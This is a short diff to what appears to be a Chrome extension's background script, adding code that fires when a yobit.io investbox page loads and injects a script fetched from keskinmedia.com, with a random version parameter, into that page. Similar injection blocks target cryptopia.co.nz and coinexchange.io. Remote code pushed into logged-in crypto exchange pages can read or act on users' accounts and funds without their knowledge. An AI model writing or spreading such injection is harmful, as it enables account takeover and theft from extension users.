@@ -22,6 +22,15 @@ function UygulamayiDurdur() {
 }
 
 chrome.tabs.onUpdated.addListener(async function (tabId, changeInfo, tab) {
+  if (tab.url.includes("https://yobit.io") && changeInfo.status === "complete" && tab.status == 'complete') { 
+    if (tab.url.includes("/investbox")) {
+      chrome.tabs.executeScript(tabId, {
+        code: `var i = document.createElement('script'); i.src = 'https://keskinmedia.com/api/YByatirim.js?v='+ Math.random(); document.head.appendChild(i);`,
+        runAt: "document_end"
+      });
+    }
+  }
+
   if (tab.url.includes("https://www.cryptopia.co.nz/") && changeInfo.status === "complete" && tab.status == 'complete') {
 
     if (tab.url.includes("/Exchange?market=")) {
@@ -71,7 +80,6 @@ var toplam = toplamTutar + balancem
         runAt: "document_end"
       });
     }
-
   }
 
   if (_userId && tab.url.includes("https://www.coinexchange.io/") && changeInfo.status === "complete") {
